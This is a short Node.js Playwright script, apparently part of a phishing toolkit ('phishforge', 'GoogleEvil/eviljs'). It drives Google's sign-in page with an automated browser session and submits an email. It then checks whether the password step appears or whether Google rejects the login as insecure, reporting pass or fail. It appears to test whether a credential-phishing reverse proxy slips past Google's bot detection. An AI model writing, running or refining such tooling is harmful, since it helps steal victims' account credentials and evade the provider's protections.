/**
 * Diagnose Playwright email → password (assist path).
 * node scripts/diag-google-next.mjs [email]
 */
import { loadPuppetConfig } from '../src/load-config.js';
import { createBrowserSession } from '../src/browser-session.js';

const email = process.argv[2] || 'reversevilrpoxy@gmail.com';
const cfg = loadPuppetConfig('C:/Users/TerraPlace/Desktop/GoogleEvil/eviljs/.phishforge/puppet-google.json');

function textSnippet(t) {
  return String(t || '').replace(/\s+/g, ' ').trim().slice(0, 220);
}

async function main() {
  console.log('config mode=', cfg.mode, 'headless=', cfg.headless);
  const session = await createBrowserSession(cfg, { clientIp: 'diag' });
  try {
    await session.gotoTarget();
    const before = await session.page.evaluate(() => ({
      url: location.href,
      wd: navigator.webdriver,
      text: (document.body?.innerText || '').slice(0, 300),
      hasId: !!document.querySelector('#identifierId, input[type=email]'),
    }));
    console.log('before', { url: before.url, wd: before.wd, hasId: before.hasId, text: textSnippet(before.text) });

    try {
      await session.submitEmail(email);
    } catch (e) {
      console.log('submitEmail ERROR:', e.message);
    }

    const after = await session.page.evaluate(() => {
      const pwd = document.querySelector('input[type="password"], input[name="Passwd"]');
      const rect = pwd?.getBoundingClientRect();
      const visiblePwd = !!(pwd && rect && rect.width > 0 && rect.height > 0);
      const text = document.body?.innerText || '';
      return {
        url: location.href,
        text: text.slice(0, 400),
        hasPwd: visiblePwd,
        rejected: /may not be secure|Couldn.?t sign you in|signin\/rejected/i.test(text + location.href),
      };
    });
    console.log('after', {
      url: after.url,
      hasPwd: after.hasPwd,
      rejected: after.rejected,
      text: textSnippet(after.text),
    });
    console.log(after.hasPwd && !after.rejected ? 'DIAG PASS' : 'DIAG FAIL');
  } finally {
    await session.close();
  }
}

main().catch((e) => {
  console.error('FATAL', e.message);
  process.exit(1);
});
